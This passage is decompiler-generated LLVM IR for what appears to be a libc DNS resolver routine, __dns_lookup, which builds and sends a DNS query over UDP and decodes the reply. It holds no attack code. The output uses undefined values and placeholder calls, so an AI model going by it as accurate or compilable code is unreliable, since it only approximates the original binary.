  %v2_100118b4 = or i32 %v1_100118b4, %v1_100118ac
  store i32 %v2_100118b4, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_100118b0, 5
  br i1 %tmp10, label %dec_label_pc_10011834, label %dec_label_pc_100118c0

dec_label_pc_100118c0:                            ; preds = %dec_label_pc_100118ac
  %v0_100118c0 = load i32, i32* @r4, align 4
  %v3_100118c0 = icmp eq i32 %v0_100118c0, 0
  %v0_100118c8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100118c0, i32 %v0_100118c8)
  %v0_100118cc = load i32, i32* %r5.global-to-local, align 4
  %v1_100118cc = load i32, i32* @r4, align 4
  %v2_100118cc = inttoptr i32 %v1_100118cc to i32*
  store i32 %v0_100118cc, i32* %v2_100118cc, align 4
  ret i32 1

dec_label_pc_100118d4:                            ; preds = %dec_label_pc_10011888, %dec_label_pc_100118a4, %dec_label_pc_10011834, %dec_label_pc_10011854, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_100118b4, { 1, 0 }
  uselistorder i32 %v1_100118b0, { 1, 0 }
  uselistorder i32 %v0_1001189c, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100118d4, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10011834, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_100118e0 = load i32, i32* @lr, align 4
  store i32 %v0_100118e0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268507404, i32* @lr, align 4
  %v1_10011908 = call i32 @malloc(i32 512)
  store i32 %v1_10011908, i32* @r30, align 4
  store i32 268507416, i32* @lr, align 4
  %v1_10011914 = call i32 @malloc(i32 1025)
  %v0_10011918 = load i32, i32* @r30, align 4
  %v3_10011918 = icmp eq i32 %v0_10011918, 0
  store i32 %v1_10011914, i32* @r21, align 4
  br i1 %v3_10011918, label %dec_label_pc_10011ed4, label %dec_label_pc_10011924

dec_label_pc_10011924:                            ; preds = %entry
  %v3_10011924 = icmp eq i32 %v1_10011914, 0
  br i1 %v3_10011924, label %dec_label_pc_10011ed4, label %dec_label_pc_1001192c

dec_label_pc_1001192c:                            ; preds = %dec_label_pc_10011924
  %v0_1001192c = load i32, i32* @r23, align 4
  %v3_1001192c = icmp eq i32 %v0_1001192c, 0
  br i1 %v3_1001192c, label %dec_label_pc_10011ed4, label %dec_label_pc_10011934

dec_label_pc_10011934:                            ; preds = %dec_label_pc_1001192c
  %v0_10011934 = load i32, i32* %r14.global-to-local, align 4
  %v1_10011934 = inttoptr i32 %v0_10011934 to i8*
  %v2_10011934 = load i8, i8* %v1_10011934, align 1
  %v3_10011934 = zext i8 %v2_10011934 to i32
  store i32 %v3_10011934, i32* %r0.global-to-local, align 4
  %v3_10011938 = icmp eq i8 %v2_10011934, 0
  br i1 %v3_10011938, label %dec_label_pc_10011ed4, label %dec_label_pc_10011940

dec_label_pc_10011940:                            ; preds = %dec_label_pc_10011934
  store i32 %v0_10011934, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  %v0_10011948 = call i32 @__GI_strlen()
  %v0_10011950 = load i32, i32* %r14.global-to-local, align 4
  %v2_10011950 = add i32 %v0_10011950, %v0_10011948
  %v1_10011958 = add i32 %v2_10011950, -1
  %v2_10011958 = inttoptr i32 %v1_10011958 to i8*
  %v3_10011958 = load i8, i8* %v2_10011958, align 1
  %v4_10011958 = zext i8 %v3_10011958 to i32
  store i32 %v4_10011958, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10031ba0.803 to i32), i32* %r29.global-to-local, align 4
  %v2_10011960 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10011960, i32* %r28.global-to-local, align 4
  store i32 %v2_10011960, i32* @r3, align 4
  %v1_1001196c = xor i32 %v4_10011958, 46
  store i32 %v1_1001196c, i32* %r17.global-to-local, align 4
  %v0_10011970 = call i32 @__pthread_return_void()
  %v0_10011978 = call i32 @__pthread_return_0()
  %v3_10011980 = load i32, i32* @global_var_1002b960.804, align 4
  store i32 %v3_10011980, i32* %r11.global-to-local, align 4
  %v3_1001198c = load i16, i16* @global_var_1002b86c.805, align 2
  %v4_1001198c = zext i16 %v3_1001198c to i32
  store i32 %v4_1001198c, i32* @r25, align 4
  %v1_10011990 = load i32, i32* @r23, align 4
  store i32 %v2_10011960, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_10011990 = srem i32 %v3_10011980, %v1_10011990
  %v2_100119ac = sub i32 %v3_10011980, %v2_10011990
  store i32 %v2_100119ac, i32* %r0.global-to-local, align 4
  store i32 %v2_10011990, i32* @r26, align 4
  %v0_100119b4 = call i32 @__pthread_return_void()
  %v0_10011ec8.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_10011ec8.pr19, 3
  br i1 %tmp57, label %dec_label_pc_100119bc.lr.ph.lr.ph, label %dec_label_pc_10011ee0

dec_label_pc_100119bc.lr.ph.lr.ph:                ; preds = %dec_label_pc_10011940
  %v2_100119d4 = ptrtoint i32* %stack_var_-144 to i32
  %v2_10011ae8 = ptrtoint i32* %stack_var_-204 to i32
  %v2_10011b48 = ptrtoint i16* %stack_var_-212 to i32
  %v2_10011b8c = ptrtoint i32* %stack_var_-248 to i32
  %v3_10011be8 = icmp eq i32 %tmp37, 0
  %v3_10011bf4 = icmp eq i32 %tmp36, 3
  %v2_10011c70 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_10011cc4 = ptrtoint i32* %stack_var_-184 to i32
  %v3_10011cf0 = icmp eq i32 %tmp33, 0
  %v3_10011c64 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_100119bc.lr.ph

dec_label_pc_100119bc:                            ; preds = %dec_label_pc_100119bc.lr.ph, %dec_label_pc_10011b6c
  %v0_100119bc = load i32, i32* @r19, align 4
  %v3_100119bc = icmp eq i32 %v0_100119bc, -1
  br i1 %v3_100119bc, label %dec_label_pc_100119cc, label %dec_label_pc_100119c4

dec_label_pc_100119c4:                            ; preds = %dec_label_pc_100119bc
  store i32 268507596, i32* @lr, align 4
  %v1_100119c8 = call i32 @__libc_close(i32 %v0_100119bc)
  br label %dec_label_pc_100119cc

dec_label_pc_100119cc:                            ; preds = %dec_label_pc_100119bc, %dec_label_pc_100119c4
  store i32 %v2_100119d4, i32* %r29.global-to-local, align 4
  %v0_100119d8 = load i32, i32* @r30, align 4
  store i32 268507616, i32* @lr, align 4
  %v3_100119dc = call i32 @__GI_memset(i32 %v0_100119d8, i32 0, i32 512)
  store i32 268507632, i32* @lr, align 4
  %v3_100119ec = call i32 @__GI_memset(i32 %v2_100119d4, i32 0, i32 48)
  %v0_100119f0 = load i32, i32* @r25, align 4
  %v1_100119f0 = add i32 %v0_100119f0, 1
  %v1_100119f4 = urem i32 %v1_100119f0, 65536
  store i32 %v1_100119f4, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011a00 = load i32, i32* @r30, align 4
  store i32 %v1_100119f4, i32* %stack_var_-144, align 4
  %v4_10011a14 = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_10011a00, i32 512)
  store i32 %v4_10011a14, i32* %r28.global-to-local, align 4
  %v1_10011a18 = icmp slt i32 %v4_10011a14, 0
  br i1 %v1_10011a18, label %dec_label_pc_10011ee0, label %dec_label_pc_10011a20

dec_label_pc_10011a20:                            ; preds = %dec_label_pc_100119cc
  %v0_10011a20 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10011a20, i32* @r4, align 4
  %v0_10011a28 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268507700, i32* @lr, align 4
  %v4_10011a30 = call i32 @strncpy(i32 %v0_10011a28, i32 %v0_10011a20, i32 1025)
  store i32 ptrtoint (i32* @global_var_1002b870.751 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10011960, i32* @r3, align 4
  %v0_10011a48 = call i32 @__pthread_return_void()
  %v0_10011a50 = call i32 @__pthread_return_0()
  %v0_10011a54 = load i32, i32* @r22, align 4
  %v1_10011a54 = icmp slt i32 %v0_10011a54, 0
  %v0_10011a5c = load i32, i32* @r26, align 4
  %v1_10011a5c = mul i32 %v0_10011a5c, 4
  store i32 %v1_10011a5c, i32* %r0.global-to-local, align 4
  %v2_10011a60 = add i32 %v1_10011a5c, %arg4
  %v3_10011a60 = inttoptr i32 %v2_10011a60 to i32*
  %v4_10011a60 = load i32, i32* %v3_10011a60, align 4
  store i32 %v4_10011a60, i32* %r29.global-to-local, align 4
  br i1 %v1_10011a54, label %dec_label_pc_10011aa8, label %dec_label_pc_10011a68

dec_label_pc_10011a68:                            ; preds = %dec_label_pc_10011a20
  %v3_10011a6c = load i32, i32* @global_var_1002b968.807, align 4
  store i32 %v3_10011a6c, i32* %r0.global-to-local, align 4
  %v2_10011a70 = icmp slt i32 %v0_10011a54, %v3_10011a6c
  br i1 %v2_10011a70, label %dec_label_pc_10011a78, label %dec_label_pc_10011aa8

dec_label_pc_10011a78:                            ; preds = %dec_label_pc_10011a68
  store i32 ptrtoint (i32* @global_var_1001a4c0.808 to i32), i32* @r4, align 4
  %v0_10011a84 = load i32, i32* @r21, align 4
  store i32 268507788, i32* @lr, align 4
  %v4_10011a88 = inttoptr i32 %v0_10011a84 to i8*
  %v5_10011a88 = call i32 @__GI_strncat(i8* %v4_10011a88, i32 ptrtoint (i32* @global_var_1001a4c0.808 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_10011a90 = load i32, i32* @r22, align 4
  %v1_10011a90 = mul i32 %v0_10011a90, 4
  store i32 %v1_10011a90, i32* %r0.global-to-local, align 4
  %v2_10011a98 = add i32 %v1_10011a90, ptrtoint (i32* @global_var_10031c50.809 to i32)
  %v3_10011a98 = inttoptr i32 %v2_10011a98 to i32*
  %v4_10011a98 = load i32, i32* %v3_10011a98, align 4
  store i32 %v4_10011a98, i32* @r4, align 4
  %v0_10011a9c = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011aa8.810 to i32), i32* @lr, align 4
  %v4_10011aa4 = inttoptr i32 %v0_10011a9c to i8*
  %v5_10011aa4 = call i32 @__GI_strncat(i8* %v4_10011aa4, i32 %v4_10011a98, i32 1025, i32 ptrtoint (i32* @global_var_10031c50.809 to i32))
  br label %dec_label_pc_10011aa8

dec_label_pc_10011aa8:                            ; preds = %dec_label_pc_10011a68, %dec_label_pc_10011a20, %dec_label_pc_10011a78
  store i32 %v2_10011960, i32* @r3, align 4
  %v0_10011ab0 = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011abc = load i32, i32* @r30, align 4
  %v1_10011abc = load i32, i32* %r28.global-to-local, align 4
  %v2_10011abc = add i32 %v1_10011abc, %v0_10011abc
  %v1_10011ac0 = sub i32 512, %v1_10011abc
  %v0_10011ac8 = load i32, i32* @r21, align 4
  store i32 %v0_10011ac8, i32* %stack_var_-240, align 4
  store i32 268507860, i32* @lr, align 4
  %v4_10011ad0 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_10011abc, i32 %v1_10011ac0)
  store i32 %v4_10011ad0, i32* @r27, align 4
  %v1_10011ad4 = icmp slt i32 %v4_10011ad0, 0
  br i1 %v1_10011ad4, label %dec_label_pc_10011ee0, label %dec_label_pc_10011adc

dec_label_pc_10011adc:                            ; preds = %dec_label_pc_10011aa8
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10011ae4 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268507892, i32* @lr, align 4
  %v3_10011af0 = inttoptr i32 %v0_10011ae4 to i8*
  %v4_10011af0 = call i32 @inet_pton(i32 10, i8* %v3_10011af0, i32 %v2_10011ae8)
  %tmp59 = icmp slt i32 %v4_10011af0, 1
  br i1 %tmp59, label %dec_label_pc_10011b04thread-pre-split, label %dec_label_pc_10011afc

dec_label_pc_10011afc:                            ; preds = %dec_label_pc_10011adc
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10011b04

dec_label_pc_10011b04thread-pre-split:            ; preds = %dec_label_pc_10011adc
  %v3_10011b04.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10011b04

dec_label_pc_10011b04:                            ; preds = %dec_label_pc_10011b04thread-pre-split, %dec_label_pc_10011afc
  %v3_10011b04 = phi i16 [ %v3_10011b04.pr, %dec_label_pc_10011b04thread-pre-split ], [ 10, %dec_label_pc_10011afc ]
  %v3_10011b08 = icmp eq i16 %v3_10011b04, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10011b08, label %dec_label_pc_10011b30, label %dec_label_pc_10011b1c

dec_label_pc_10011b1c:                            ; preds = %dec_label_pc_10011b04
  %v0_10011b20 = load i32, i32* @r29, align 4
  store i32 268507948, i32* @lr, align 4
  %v1_10011b28 = call i32 @inet_addr(i32 %v0_10011b20)
  %v3_10011b30.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10011b30

dec_label_pc_10011b30:                            ; preds = %dec_label_pc_10011b04, %dec_label_pc_10011b1c
  %v3_10011b30 = phi i16 [ 10, %dec_label_pc_10011b04 ], [ %v3_10011b30.pre, %dec_label_pc_10011b1c ]
  %v4_10011b30 = sext i16 %v3_10011b30 to i32
  store i32 268507968, i32* @lr, align 4
  %v3_10011b3c = call i32 @socket(i32 %v4_10011b30, i32 2, i32 17)
  store i32 %v3_10011b3c, i32* @r19, align 4
  %v1_10011b40 = icmp slt i32 %v3_10011b3c, 0
  br i1 %v1_10011b40, label %dec_label_pc_10011b6c, label %dec_label_pc_10011b48

dec_label_pc_10011b48:                            ; preds = %dec_label_pc_10011b30
  store i32 268507988, i32* @lr, align 4
  %v3_10011b50 = call i32 @__libc_connect(i32 %v2_10011b48, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_10011b50, -1
  br i1 %tmp60, label %dec_label_pc_10011b74, label %dec_label_pc_10011b5c

dec_label_pc_10011b5c:                            ; preds = %dec_label_pc_10011b48
  %v0_10011b5c = call i32 @__errno_location()
  %v1_10011b60 = inttoptr i32 %v0_10011b5c to i32*
  %v2_10011b60 = load i32, i32* %v1_10011b60, align 4
  store i32 %v2_10011b60, i32* %r0.global-to-local, align 4
  %v3_10011b64 = icmp eq i32 %v2_10011b60, 101
  br i1 %v3_10011b64, label %dec_label_pc_10011eac, label %dec_label_pc_10011b6c

dec_label_pc_10011b6c:                            ; preds = %dec_label_pc_10011b5c, %dec_label_pc_10011b30
  %v0_10011b6c = load i32, i32* %r18.global-to-local, align 4
  %v1_10011b6c = add i32 %v0_10011b6c, 1
  store i32 %v1_10011b6c, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_10011b6c, 3
  br i1 %tmp61, label %dec_label_pc_100119bc, label %dec_label_pc_10011ee0

dec_label_pc_10011b74:                            ; preds = %dec_label_pc_10011b48
  %v0_10011b74 = load i32, i32* @r28, align 4
  %v1_10011b74 = load i32, i32* @r27, align 4
  %v2_10011b74 = add i32 %v1_10011b74, %v0_10011b74
  %v0_10011b78 = load i32, i32* @r30, align 4
  %v0_10011b80 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_10011b88.812 to i32), i32* @lr, align 4
  %v4_10011b84 = call i32 @__libc_send(i32 %v0_10011b80, i32 %v0_10011b78, i32 %v2_10011b74, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011b9c = load i32, i32* @r19, align 4
  store i32 %v0_10011b9c, i32* %stack_var_-248, align 4
  store i32 268508068, i32* @lr, align 4
  %v3_10011ba0 = call i32 @__libc_poll(i32 %v2_10011b8c, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10011ba0, 1
  br i1 %tmp62, label %dec_label_pc_10011eac, label %dec_label_pc_10011bac

dec_label_pc_10011bac:                            ; preds = %dec_label_pc_10011b74
  %v0_10011bac = load i32, i32* @r19, align 4
  %v0_10011bb0 = load i32, i32* @r30, align 4
  store i32 268508096, i32* @lr, align 4
  %v4_10011bbc = call i32 @__libc_recv(i32 %v0_10011bac, i32 %v0_10011bb0, i32 512, i32 0)
  store i32 %v4_10011bbc, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_10011bbc, 12
  br i1 %tmp63, label %dec_label_pc_10011e54, label %dec_label_pc_10011bcc

dec_label_pc_10011bcc:                            ; preds = %dec_label_pc_10011bac
  %v0_10011bcc = load i32, i32* @r30, align 4
  %v2_10011bd4 = inttoptr i32 %v0_10011bcc to i8*
  %v3_10011bd4 = call i32 @__decode_header(i8* %v2_10011bd4, i32 %v2_100119d4)
  %v3_10011bd8 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_10011bd8, i32* @r20, align 4
  %v1_10011bdc = load i32, i32* @r25, align 4
  %v4_10011bdc = icmp eq i32 %v3_10011bd8, %v1_10011bdc
  br i1 %v4_10011bdc, label %dec_label_pc_10011be4, label %dec_label_pc_10011e54

dec_label_pc_10011be4:                            ; preds = %dec_label_pc_10011bcc
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10011be8, label %dec_label_pc_10011e54, label %dec_label_pc_10011bf0

dec_label_pc_10011bf0:                            ; preds = %dec_label_pc_10011be4
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_10011bf4, label %dec_label_pc_10011bfc, label %dec_label_pc_10011c64

dec_label_pc_10011bfc:                            ; preds = %dec_label_pc_10011bf0
  %v0_10011bfc = load i32, i32* %r17.global-to-local, align 4
  %v3_10011bfc = icmp eq i32 %v0_10011bfc, 0
  br i1 %v3_10011bfc, label %dec_label_pc_10011c04, label %dec_label_pc_10011c58

dec_label_pc_10011c04:                            ; preds = %dec_label_pc_10011bfc
  store i32 ptrtoint (i32* @global_var_1002b870.751 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10011960, i32* %r28.global-to-local, align 4
  store i32 %v2_10011960, i32* @r3, align 4
  %v0_10011c20 = call i32 @__pthread_return_void()
  %v0_10011c28 = call i32 @__pthread_return_0()
  %v3_10011c30 = load i32, i32* @global_var_1002b968.807, align 4
  store i32 %v2_10011960, i32* @r3, align 4
  %v1_10011c3c = add i32 %v3_10011c30, -1
  store i32 %v1_10011c3c, i32* %r29.global-to-local, align 4
  %v0_10011c40 = call i32 @__pthread_return_void()
  %v0_10011c44 = load i32, i32* @r22, align 4
  %v2_10011c44 = icmp slt i32 %v0_10011c44, %v1_10011c3c
  br i1 %v2_10011c44, label %dec_label_pc_10011c4c, label %dec_label_pc_10011c58

dec_label_pc_10011c4c:                            ; preds = %dec_label_pc_10011c04
  %v1_10011c4c = add i32 %v0_10011c44, 1
  store i32 %v1_10011c4c, i32* @r22, align 4
  %v0_10011c50 = load i32, i32* @r20, align 4
  store i32 %v0_10011c50, i32* @r25, align 4
  br label %dec_label_pc_10011ec8thread-pre-split.backedge

dec_label_pc_10011c58:                            ; preds = %dec_label_pc_10011c04, %dec_label_pc_10011bfc
  %v0_10011c58 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10011c8c

dec_label_pc_10011c64:                            ; preds = %dec_label_pc_10011bf0
  br i1 %v3_10011c64, label %dec_label_pc_10011c6c, label %dec_label_pc_10011e54

dec_label_pc_10011c6c:                            ; preds = %dec_label_pc_10011c64
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_10011c84, label %dec_label_pc_10011c78

dec_label_pc_10011c78:                            ; preds = %dec_label_pc_10011c6c
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_10011ca410 = load i32, i32* @r30, align 4
  store i32 %v0_10011ca410, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10011c94

dec_label_pc_10011c84:                            ; preds = %dec_label_pc_10011c6c
  %v0_10011c84 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10011c8c

dec_label_pc_10011c8c:                            ; preds = %dec_label_pc_10011c58, %dec_label_pc_10011c84
  %storemerge3 = phi i32 [ %v0_10011c84, %dec_label_pc_10011c84 ], [ %v0_10011c58, %dec_label_pc_10011c58 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_10011c84 ], [ 1, %dec_label_pc_10011c58 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10011c8c = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10011c8c, align 4
  br label %dec_label_pc_10011ef0

dec_label_pc_10011c94:                            ; preds = %dec_label_pc_10011c78, %dec_label_pc_10011c94
  %v0_10011ca414 = phi i32 [ %v0_10011ca410, %dec_label_pc_10011c78 ], [ %v0_10011ca4, %dec_label_pc_10011c94 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_10011c78 ], [ %v2_10011c98, %dec_label_pc_10011c94 ]
  store i32 268508312, i32* @lr, align 4
  %v2_10011c94 = call i32 @__length_question(i32 %v0_10011ca414, i32 %storemerge213)
  %v0_10011c98 = load i32, i32* %r28.global-to-local, align 4
  %v2_10011c98 = add i32 %v0_10011c98, %v2_10011c94
  %v0_10011ca8.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10011c98, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10011c98, i32* @r4, align 4
  %v0_10011ca4 = load i32, i32* @r30, align 4
  store i32 %v0_10011ca4, i32* @r3, align 4
  %v2_10011ca8 = icmp slt i32 %v0_10011ca8.pr, 1
  %v1_10011cac = add i32 %v0_10011ca8.pr, 1
  store i32 %v1_10011cac, i32* %r29.global-to-local, align 4
  br i1 %v2_10011ca8, label %dec_label_pc_10011c94, label %dec_label_pc_10011cb4

dec_label_pc_10011cb4:                            ; preds = %dec_label_pc_10011c94
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_10011c70, label %dec_label_pc_10011e00, label %dec_label_pc_10011e08

dec_label_pc_10011cc4:                            ; preds = %dec_label_pc_10011e00
  store i32 %v2_10011cc4, i32* %r29.global-to-local, align 4
  %v0_10011cc8 = load i32, i32* @r30, align 4
  store i32 268508380, i32* @lr, align 4
  %v5_10011cd8 = call i32 @__decode_answer(i32 %v0_10011cc8, i32 %v0_10011ccc, i32 %v1_10011e00, i32* nonnull %stack_var_-184)
  store i32 %v5_10011cd8, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_10011cd8, -1
  br i1 %tmp64, label %dec_label_pc_10011cfc, label %dec_label_pc_10011ce4

dec_label_pc_10011ce4:                            ; preds = %dec_label_pc_10011cc4
  %v0_10011ce4 = load i32, i32* @r24, align 4
  %v3_10011ce4 = icmp eq i32 %v0_10011ce4, 0
  br i1 %v3_10011ce4, label %dec_label_pc_10011e54, label %dec_label_pc_10011cec

dec_label_pc_10011cec:                            ; preds = %dec_label_pc_10011ce4
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10011cf0, label %dec_label_pc_10011e54, label %dec_label_pc_10011e08

dec_label_pc_10011cfc:                            ; preds = %dec_label_pc_10011cc4
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10011d00 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10011d00, label %dec_label_pc_10011da4, label %dec_label_pc_10011d08

dec_label_pc_10011d08:                            ; preds = %dec_label_pc_10011cfc
  %v0_10011d08 = load i32, i32* @r31, align 4
  store i32 %v2_10011cc4, i32* @r4, align 4
  %v1_10011d10 = add i32 %v0_10011d08, 28
  %v2_10011d10 = inttoptr i32 %v1_10011d10 to i32*
  %v3_10011d10 = load i32, i32* %v2_10011d10, align 4
  store i32 %v3_10011d10, i32* %r0.global-to-local, align 4
  store i32 %v0_10011d08, i32* @r3, align 4
  %v1_10011d18 = add i32 %v0_10011d08, 36
  %v2_10011d18 = inttoptr i32 %v1_10011d18 to i32*
  %v3_10011d18 = load i32, i32* %v2_10011d18, align 4
  store i32 %v3_10011d18, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268508464, i32* @lr, align 4
  %v0_10011d2c = call i32 @memcpy()
  %v0_10011d30 = load i32, i32* @r31, align 4
  %v1_10011d30 = add i32 %v0_10011d30, 4
  %v2_10011d30 = inttoptr i32 %v1_10011d30 to i32*
  %v3_10011d30 = load i32, i32* %v2_10011d30, align 4
  %v3_10011d34 = icmp eq i32 %v3_10011d30, 24
  br i1 %v3_10011d34, label %dec_label_pc_10011d08.dec_label_pc_10011d58_crit_edge, label %dec_label_pc_10011d3c

dec_label_pc_10011d08.dec_label_pc_10011d58_crit_edge: ; preds = %dec_label_pc_10011d08
  %v1_10011d58.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10011d58

dec_label_pc_10011d3c:                            ; preds = %dec_label_pc_10011d08
  %v1_10011d3c = add i32 %v0_10011d30, 28
  %v2_10011d3c = inttoptr i32 %v1_10011d3c to i32*
  %v3_10011d3c = load i32, i32* %v2_10011d3c, align 4
  store i32 %v3_10011d3c, i32* %r0.global-to-local, align 4
  %v3_10011d40 = icmp eq i32 %v3_10011d3c, 0
  br i1 %v3_10011d40, label %dec_label_pc_10011e08, label %dec_label_pc_10011d48

dec_label_pc_10011d48:                            ; preds = %dec_label_pc_10011d3c
  %v0_10011d48 = load i32, i32* %r16.global-to-local, align 4
  %v3_10011d48 = icmp eq i32 %v0_10011d48, 1
  br i1 %v3_10011d48, label %dec_label_pc_10011d58, label %dec_label_pc_10011d50

dec_label_pc_10011d50:                            ; preds = %dec_label_pc_10011d48
  %v3_10011d50 = icmp eq i32 %v0_10011d48, 28
  br i1 %v3_10011d50, label %dec_label_pc_10011d58, label %dec_label_pc_10011e08

dec_label_pc_10011d58:                            ; preds = %dec_label_pc_10011d08.dec_label_pc_10011d58_crit_edge, %dec_label_pc_10011d50, %dec_label_pc_10011d48
  %v1_10011d58 = phi i32 [ %v1_10011d58.pre, %dec_label_pc_10011d08.dec_label_pc_10011d58_crit_edge ], [ 28, %dec_label_pc_10011d50 ], [ 1, %dec_label_pc_10011d48 ]
  %v4_10011d58 = icmp eq i32 %v3_10011d30, %v1_10011d58
  br i1 %v4_10011d58, label %dec_label_pc_10011d6c, label %dec_label_pc_10011d60

dec_label_pc_10011d60:                            ; preds = %dec_label_pc_10011d58
  %v1_10011d60 = inttoptr i32 %v0_10011d30 to i32*
  %v2_10011d60 = load i32, i32* %v1_10011d60, align 4
  store i32 ptrtoint (i32* @global_var_10011d68.815 to i32), i32* @lr, align 4
  %v1_10011d64 = call i32 @free(i32 %v2_10011d60)
  br label %dec_label_pc_10011dec

dec_label_pc_10011d6c:                            ; preds = %dec_label_pc_10011d58
  %v1_10011d70 = add i32 %v0_10011d30, 16
  %v2_10011d70 = inttoptr i32 %v1_10011d70 to i32*
  %v3_10011d70 = load i32, i32* %v2_10011d70, align 4
  store i32 %v3_10011d70, i32* %r11.global-to-local, align 4
  %v0_10011d74 = load i32, i32* @r24, align 4
  %v2_10011d74 = sub i32 %tmp35, %v0_10011d74
  %v1_10011d78 = add i32 %v0_10011d30, 32
  %v2_10011d78 = inttoptr i32 %v1_10011d78 to i32*
  %v3_10011d78 = load i32, i32* %v2_10011d78, align 4
  store i32 %v3_10011d78, i32* %r0.global-to-local, align 4
  %v1_10011d7c = add i32 %v2_10011d74, -1
  %v1_10011d80 = add i32 %v3_10011d70, 4
  %v2_10011d84 = mul i32 %v1_10011d7c, %v1_10011d80
  store i32 %v2_10011d84, i32* %r11.global-to-local, align 4
  %v2_10011d88 = add i32 %v0_10011d30, 36
  %v3_10011d88 = inttoptr i32 %v2_10011d88 to i32*
  store i32 %v1_10011d7c, i32* %v3_10011d88, align 4
  %v0_10011d8c = load i32, i32* %r11.global-to-local, align 4
  %v1_10011d8c = load i32, i32* %r0.global-to-local, align 4
